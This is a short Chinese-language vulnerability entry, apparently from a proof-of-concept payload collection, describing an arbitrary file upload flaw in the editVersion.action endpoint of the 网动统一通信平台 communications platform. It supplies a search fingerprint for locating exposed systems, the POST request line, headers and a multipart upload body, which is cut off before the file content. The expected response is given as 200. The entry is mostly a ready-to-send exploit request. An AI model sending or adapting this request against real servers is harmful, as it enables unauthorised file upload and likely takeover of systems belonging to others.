# 网动统一通信平台-editVersion.action存在任意文件上传漏洞

- **系统**：网动统一通信平台　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="网动统一通信平台"`
- **请求**：`POST /acenter/version!editVersion.action HTTP/1.1`
- **关键头**：`Sec-GPC: 1`　`Content-Type: multipart/form-data; boundary=---------------------------123…`　`Priority: u=0, i`　`Content-Length: 1073`

**请求体 / payload**
```
-----------------------------12321321312321312
Content-Disposition: form-data; name="APP"
3
-----------------------------12321321312321312
Content-Disposition: form-data; name="IA_OEM_KEY"
iactive
-----------------------------12321321312321312
Content-Disposition: form-data; name="IA_BASE_VERSION"
0.8.1
-----------------------------12321321312321312
Content-Disposition: form-data; name="IA_CURRENT_VERSION"
8.0.2
-----------------------------12321321312321312
Content-Disposition: form-data; name="fileUpload.file"; filename=""
Content-Type: application/octet-stream
-----------------------------1…（脚本共 937 字，完整版见原文）
```
- **预期**：200　|　—